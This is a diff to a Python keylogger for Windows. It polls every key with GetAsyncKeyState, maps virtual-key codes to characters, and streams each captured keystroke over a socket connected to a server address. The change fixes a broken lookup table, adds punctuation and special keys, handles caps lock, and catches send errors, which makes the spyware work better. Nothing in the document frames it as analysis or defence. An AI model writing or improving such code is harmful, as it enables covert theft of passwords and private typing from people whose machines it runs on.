@@ -8,84 +8,77 @@ clientsocket.connect(serverAddress)
 
 user = ctypes.windll.user32
 
-def getkey(code):
-    asciiTable = {
-        "a": "a",
-        "b": "b",
-        "c": "c",
-        "d": "d",
-        "e": "e",
-        "f": "f",
-        "g": "g",
-        "h": "h",
-        "i": "i",
-        "j": "j",
-        "k": "k",
-        "l": "l",
-        "m": "m",
-        "n": "n",
-        "o": "o",
-        "p": "p",
-        "q": "q",
-        "r": "r",
-        "s": "s",
-        "t": "t",
-        "u": "u",
-        "v": "v",
-        "w": "w",
-        "x": "x",
-        "y": "y",
-        "z": "z",
-        "A": "A",
-        "B": "B",
-        "C": "C",
-        "D": "D",
-        "E": "E",
-        "F": "F",
-        "G": "G",
-        "H": "H",
-        "I": "I",
-        "J": "J",
-        "K": "K",
-        "L": "L",
-        "M": "M",
-        "N": "N",
-        "O": "O",
-        "P": "P",
-        "Q": "Q",
-        "R": "R",
-        "S": "S",
-        "T": "T",
-        "U": "U",
-        "V": "V",
-        "W": "W",
-        "X": "X",
-        "Y": "Y",
-        "Z": "Z",
-        "0": "[0]",
-        "1": "[1]",
-        "2": "[2]",
-        "3": "[3]",
-        "4": "[4]",
-        "5": "[5]",
-        "6": "[6]",
-        "8": "[8]",
-        "9": "[9]",
-    }
-    return asciiTable.get(code, "")
+# Define ASCII mappings for characters, numbers, and symbols
+asciiTable = {
+    8: "[BACKSPACE]",
+    9: "[TAB]",
+    13: "[ENTER]",
+    27: "[ESC]",
+    32: " ",
+    48: "0",
+    49: "1",
+    50: "2",
+    51: "3",
+    52: "4",
+    53: "5",
+    54: "6",
+    55: "7",
+    56: "8",
+    57: "9",
+    65: "A",
+    66: "B",
+    67: "C",
+    68: "D",
+    69: "E",
+    70: "F",
+    71: "G",
+    72: "H",
+    73: "I",
+    74: "J",
+    75: "K",
+    76: "L",
+    77: "M",
+    78: "N",
+    79: "O",
+    80: "P",
+    81: "Q",
+    82: "R",
+    83: "S",
+    84: "T",
+    85: "U",
+    86: "V",
+    87: "W",
+    88: "X",
+    89: "Y",
+    90: "Z",
+    186: ";",
+    187: "=",
+    188: ",",
+    189: "-",
+    190: ".",
+    191: "/",
+    192: "`",
+    219: "[",
+    220: "\\",
+    221: "]",
+    222: "'"
+}
 
 def main():
-    keyStates = {}  # keep track if each key is pressed
-    while True:  # while loop ensures that the keylogger continuously monitors the keyboard
-        for i in range(256):  # iterate all possible key strokes from 0 to 255
-            if user.GetAsyncKeyState(i) & 0x8000 != 0:  # if the key is currently pressed
+    keyStates = {}
+    while True:
+        for i in range(256):
+            if user.GetAsyncKeyState(i) & 0x8000 != 0:
                 if keyStates.get(i, False) == False:
                     keyStates[i] = True
-                    # checking if caps lock is off
-                    key = getkey(str(i))
-                    if user.GetKeyState(0x14) & 0x0001 == 0:
+                    key = asciiTable.get(i, "")
+                    if user.GetKeyState(0x14) & 0x0001 == 0 and i in range(65, 91):
                         key = key.lower()
-                    clientsocket.sendall(key.encode())
+                    if key:
+                        try:
+                            clientsocket.sendall(key.encode())
+                        except Exception as e:
+                            print(f"Error sending key: {e}")
             else:
                 keyStates[i] = False
         time.sleep(0.01)
